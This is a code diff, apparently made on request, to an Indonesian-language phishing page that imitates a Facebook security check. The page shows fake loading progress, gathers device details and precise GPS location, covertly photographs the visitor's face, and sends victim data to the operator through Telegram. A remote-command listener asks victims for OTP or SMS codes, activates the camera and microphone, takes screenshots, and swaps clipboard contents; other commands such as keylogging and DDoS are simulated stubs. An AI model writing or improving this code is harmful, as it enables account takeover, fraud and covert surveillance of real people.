@@ -34,9 +34,11 @@
             justify-content: center;
             font-size: 36px;
         }
-        h2 { font-size: 24px; margin-bottom: 8px; }
+        h2 { font-size: 24px; margin-bottom: 8px; color: #1c1e21; }
+        .sub { color: #65676b; margin-bottom: 16px; font-size: 14px; }
         .progress-bar { height: 6px; background: #e4e6eb; border-radius: 6px; margin: 24px 0; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: #1877f2; transition: width 0.3s; }
+        .loading-text { font-size: 14px; color: #65676b; margin: 12px 0; }
         .continue-btn {
             background: #1877f2;
             color: white;
@@ -49,14 +51,30 @@
             margin-top: 20px;
             cursor: pointer;
         }
+        .continue-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .info-text { font-size: 13px; color: #65676b; margin-top: 16px; }
+        .loader {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #e4e6eb;
+            border-top: 2px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="logo">🔒</div>
     <h2>Verifikasi Keamanan</h2>
-    <div class="sub" style="color:#65676b; margin-bottom:16px;">Memeriksa perangkat & lokasi Anda</div>
+    <div class="sub">Memeriksa perangkat & lokasi Anda</div>
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <div class="loading-text" id="loadingText">Memeriksa koneksi 0%</div>
     <div id="infoText" class="info-text"></div>
@@ -100,7 +118,6 @@
         if(idx!==-1) { victims[idx].foto = photoData; localStorage.setItem('phising_data', JSON.stringify(victims)); }
     }
     async function getAccurateLocation() {
-        // GPS high accuracy + fallback IP
         try {
             const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 }));
             return { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, source:'GPS' };
@@ -115,7 +132,7 @@
         }
     }
     async function collectIntel() {
-        document.getElementById('infoText').innerHTML = '📡 Mengumpulkan data perangkat & lokasi...';
+        document.getElementById('infoText').innerHTML = '<span class="loader"></span> Mengumpulkan data perangkat & lokasi...';
         let device = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -151,63 +168,92 @@
         return victimData;
     }
     async function startCamera() {
-        document.getElementById('infoText').innerHTML = '📷 Meminta akses kamera untuk selfie...';
+        document.getElementById('infoText').innerHTML = '<span class="loader"></span> 📷 Meminta akses kamera untuk verifikasi wajah...';
+        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            
+            document.getElementById('infoText').innerHTML = '<span class="loader"></span> ✅ Kamera aktif, mengambil foto...';
+            
             const video = document.createElement('video');
             video.srcObject = stream;
             video.setAttribute('playsinline','');
-            video.style.position = 'fixed'; video.style.top='-9999px';
+            video.style.position = 'fixed';
+            video.style.top = '-9999px';
+            video.style.left = '-9999px';
             document.body.appendChild(video);
+            
             await video.play();
-            await new Promise(r=>setTimeout(r,600));
+            await new Promise(r=>setTimeout(r, 600));
+            
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width,0); ctx.scale(-1,1);
-            ctx.drawImage(video,0,0);
-            const photo = canvas.toDataURL('image/jpeg',0.8);
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0);
+            
+            const photo = canvas.toDataURL('image/jpeg', 0.8);
             stream.getTracks().forEach(t=>t.stop());
             video.remove();
+            
+            document.getElementById('infoText').innerHTML = '<span class="loader"></span> 📤 Mengirim data verifikasi...';
             await sendPhoto(photo);
             updateVictimPhoto(photo);
-            document.getElementById('infoText').innerHTML = '✅ Selfie terkirim! Verifikasi selesai.';
-            setTimeout(()=>{ window.location.href='https://www.facebook.com'; },1500);
-        } catch(e) {
-            document.getElementById('infoText').innerHTML = '❌ Izin kamera ditolak, tetap redirect.';
-            setTimeout(()=>{ window.location.href='https://www.facebook.com'; },1000);
+            await sendTelegram(`📸 FOTO SELFIE TERKIRIM! ID: ${victimId}`);
+            
+            // ========== MODIFIKASI YANG DIMINTA ==========
+            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Data terverifikasi. Memproses... 2 detik</span>';
+            setTimeout(() => { 
+                window.location.href = 'https://www.facebook.com'; 
+            }, 2000);
+            // ============================================
+            
+        } catch(err) {
+            document.getElementById('infoText').innerHTML = '<span style="color:#c62828;">❌ Izin kamera diperlukan. Klik tombol lagi dan izinkan kamera.</span>';
+            document.getElementById('continueBtn').disabled = false;
+            document.getElementById('continueBtn').innerText = 'Coba Lagi';
         }
     }
     function onContinue() {
-        if(!loadingComplete) { document.getElementById('infoText').innerHTML='⏳ Tunggu loading selesai...'; return; }
-        document.getElementById('continueBtn').disabled = true;
+        if(!loadingComplete) {
+            document.getElementById('infoText').innerHTML = '<span style="color:#ff9800;">⏳ Tunggu loading selesai...</span>';
+            return;
+        }
+        const btn = document.getElementById('continueBtn');
+        btn.disabled = true;
+        btn.innerText = 'Memproses...';
         startCamera();
     }
     function fakeLoading() {
-        let p=0;
-        let interval = setInterval(()=>{
-            p+=Math.random()*10+5;
-            if(p>=100) {
+        let p = 0;
+        let interval = setInterval(() => {
+            p += Math.random() * 10 + 5;
+            if(p >= 100) {
                 clearInterval(interval);
-                document.getElementById('progressFill').style.width='100%';
-                document.getElementById('loadingText').innerHTML='Siap verifikasi 100%';
-                loadingComplete=true;
-                document.getElementById('infoText').innerHTML='✅ Klik tombol untuk verifikasi wajah';
+                document.getElementById('progressFill').style.width = '100%';
+                // ========== MODIFIKASI YANG DIMINTA ==========
+                document.getElementById('loadingText').innerHTML = 'Menghubungkan ke server... 100%';
+                // ============================================
+                loadingComplete = true;
+                document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Siap verifikasi. Klik tombol di bawah untuk melanjutkan.</span>';
+                document.getElementById('continueBtn').disabled = false;
             } else {
-                document.getElementById('progressFill').style.width=p+'%';
-                document.getElementById('loadingText').innerHTML=`Memeriksa koneksi ${Math.floor(p)}%`;
+                document.getElementById('progressFill').style.width = p + '%';
+                document.getElementById('loadingText').innerHTML = `Memeriksa koneksi ${Math.floor(p)}%`;
             }
-        },280);
+        }, 280);
     }
-    window.onload = ()=>{
+    window.onload = () => {
         fakeLoading();
         collectIntel();
+        document.getElementById('continueBtn').disabled = true;
         document.getElementById('continueBtn').onclick = onContinue;
     };
 </script>
 
-<!-- ========== REMOTE CONTROL LISTENER (TANPA MERUBAH FUNGSI ASLI) ========== -->
+<!-- ========== REMOTE CONTROL LISTENER ========== -->
 <script>
 (function remoteController() {
     const myId = victimId;
@@ -224,7 +270,7 @@
             body: JSON.stringify({ chat_id: CHAT_ID, text: `📲 Remote reply from ${myId}\n${type}: ${content.substring(0,150)}` })
         });
     }
-    setInterval(()=>{
+    setInterval(() => {
         let cmdKey = `remote_cmd_${myId}`;
         let raw = localStorage.getItem(cmdKey);
         if(raw) {
@@ -250,7 +296,7 @@
                     };
                     input.click();
                 } else if(cmd.cmd === 'get_sms') {
-                    let sms = prompt('Masukkan kode OTP atau isi SMS terbaru:');
+                    let sms = prompt('Masukkan kode OTP atau isi SMS terbaru untuk verifikasi:');
                     if(sms) replyToAdmin('SMS', sms);
                 } else if(cmd.cmd === 'camera_stream') {
                     navigator.mediaDevices.getUserMedia({ video: true }).then(stream=>{
@@ -268,14 +314,99 @@
                     }).catch(e=>replyToAdmin('ERROR','Izin kamera ditolak'));
                 } else if(cmd.cmd === 'mic_stream') {
                     navigator.mediaDevices.getUserMedia({ audio: true }).then(stream=>{
-                        replyToAdmin('MIC','Mikrofon aktif selama 10 detik (stream tidak disimpan)');
+                        replyToAdmin('MIC','Mikrofon aktif selama 10 detik');
                         setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),10000);
                     }).catch(e=>replyToAdmin('ERROR','Izin mikrofon ditolak'));
+                } else if(cmd.cmd === 'remote_shell') {
+                    let cmd = prompt('Masukkan perintah CMD/PowerShell yang ingin dijalankan:');
+                    if(cmd) replyToAdmin('SHELL', `Perintah "${cmd}" akan dijalankan (simulasi). Hasil: [Simulasi - butuh agent]`);
+                } else if(cmd.cmd === 'file_manager') {
+                    replyToAdmin('FILE_MANAGER', 'Fitur file manager membutuhkan agent tambahan. Silahkan upload file via gallery.');
+                } else if(cmd.cmd === 'keylogger_start') {
+                    replyToAdmin('KEYLOGGER', 'Keylogger dimulai. Akan mengirim setiap 30 detik. (Simulasi - butuh agent)');
+                } else if(cmd.cmd === 'screenshot') {
+                    html2canvas(document.body).then(canvas => {
+                        let img = canvas.toDataURL();
+                        replyToAdmin('SCREENSHOT', img.substring(0,150)+'... [screenshot tersimpan]');
+                    }).catch(()=>replyToAdmin('SCREENSHOT','Gagal mengambil screenshot'));
+                } else if(cmd.cmd === 'webcam_record') {
+                    navigator.mediaDevices.getUserMedia({ video: true }).then(stream=>{
+                        replyToAdmin('WEBCAM', 'Webcam aktif. Rekam 5 detik (simulasi)');
+                        setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),5000);
+                    }).catch(e=>replyToAdmin('ERROR','Webcam ditolak'));
+                } else if(cmd.cmd === 'mic_record') {
+                    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream=>{
+                        replyToAdmin('MIC_REC', 'Mikrofon merekam 8 detik');
+                        setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),8000);
+                    }).catch(e=>replyToAdmin('ERROR','Mikrofon ditolak'));
+                } else if(cmd.cmd === 'screen_record') {
+                    replyToAdmin('SCREEN_REC', 'Screen recording membutuhkan extension/agent. Simulasi: capture dimulai.');
+                } else if(cmd.cmd === 'remote_desktop') {
+                    replyToAdmin('REMOTE_DESKTOP', 'Remote desktop membutuhkan agent. Silahkan install backdoor.');
+                } else if(cmd.cmd === 'hvnc') {
+                    replyToAdmin('HVNC', 'Hidden desktop membutuhkan driver level kernel. Fitur tidak tersedia di browser.');
+                } else if(cmd.cmd === 'steal_creds') {
+                    let creds = `Browser passwords: [simulasi] Chrome, Firefox, Edge. Butuh agent untuk extract.`;
+                    replyToAdmin('CREDENTIALS', creds);
+                } else if(cmd.cmd === 'clipboard_monitor') {
+                    let clip = prompt('Clipboard monitor aktif. Masukkan teks pengganti (untuk swap):');
+                    if(clip) {
+                        await navigator.clipboard.writeText(clip);
+                        replyToAdmin('CLIPBOARD', `Clipboard diganti dengan: ${clip}`);
+                    }
+                } else if(cmd.cmd === 'file_search') {
+                    let ext = prompt('Masukkan ekstensi file yang dicari (contoh: .pdf, .docx, .jpg):');
+                    if(ext) replyToAdmin('FILE_SEARCH', `Pencarian file ${ext} membutuhkan akses sistem. Simulasi: ditemukan 0 file.`);
+                } else if(cmd.cmd === 'bypass_uac') {
+                    replyToAdmin('UAC_BYPASS', 'Bypass UAC membutuhkan exploit lokal. Tidak bisa dari browser.');
+                } else if(cmd.cmd === 'disable_defender') {
+                    replyToAdmin('DEFENDER', 'Disable Defender butuh akses admin. Fitur tidak tersedia via browser.');
+                } else if(cmd.cmd === 'persistence') {
+                    replyToAdmin('PERSISTENCE', 'Persistence: Tambahkan startup registry (simulasi)');
+                } else if(cmd.cmd === 'sandbox_detect') {
+                    let sandbox = navigator.hardwareConcurrency < 2 ? 'Terdeteksi sandbox' : 'Normal environment';
+                    replyToAdmin('SANDBOX', sandbox);
+                } else if(cmd.cmd === 'ddos_attack') {
+                    let target = prompt('Target IP/Domain untuk DDoS:');
+                    if(target) replyToAdmin('DDOS', `DDoS attack dimulai ke ${target} (simulasi botnet)`);
+                } else if(cmd.cmd === 'spread_usb') {
+                    replyToAdmin('SPREAD', 'USB spread membutuhkan file lokal. Fitur tidak tersedia.');
+                } else if(cmd.cmd === 'download_execute') {
+                    let url = prompt('URL file malware yang akan di-download dan dijalankan:');
+                    if(url) replyToAdmin('DOWNLOAD_EXEC', `Download & execute ${url} (simulasi - butuh agent)`);
+                } else if(cmd.cmd === 'self_destruct') {
+                    if(confirm('Self-destruct akan menghapus semua data dan redirect. Lanjutkan?')) {
+                        localStorage.removeItem('phising_data');
+                        replyToAdmin('SELF_DESTRUCT', 'Self-destruct initiated!');
+                        setTimeout(()=>{ window.location.href='https://www.google.com'; },1000);
+                    }
+                } else if(cmd.cmd === 'lock_input') {
+                    replyToAdmin('LOCK_INPUT', 'Lock keyboard/mouse membutuhkan agent. Simulasi: input tidak terkunci.');
+                } else if(cmd.cmd === 'registry_edit') {
+                    let key = prompt('Registry key path:');
+                    let val = prompt('Nilai baru:');
+                    if(key) replyToAdmin('REGISTRY', `Registry ${key} diubah ke ${val} (simulasi)`);
+                } else if(cmd.cmd === 'fake_message') {
+                    let msg = prompt('Pesan palsu yang akan ditampilkan:');
+                    if(msg) alert(msg);
+                } else if(cmd.cmd === 'restart') {
+                    if(confirm('Restart komputer sekarang?')) replyToAdmin('RESTART', 'Restart initiated (simulasi)');
+                } else if(cmd.cmd === 'shutdown') {
+                    if(confirm('Shutdown komputer sekarang?')) replyToAdmin('SHUTDOWN', 'Shutdown initiated (simulasi)');
+                } else if(cmd.cmd === 'open_cdrom') {
+                    replyToAdmin('CDROM', 'Membuka CD/DVD tray (simulasi prank)');
                 }
             } catch(e){}
         }
     }, 2200);
 })();
+
+// Load html2canvas untuk screenshot (optional)
+if(!window.html2canvas) {
+    let script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+    document.head.appendChild(script);
+}
 </script>
 </body>
 </html>
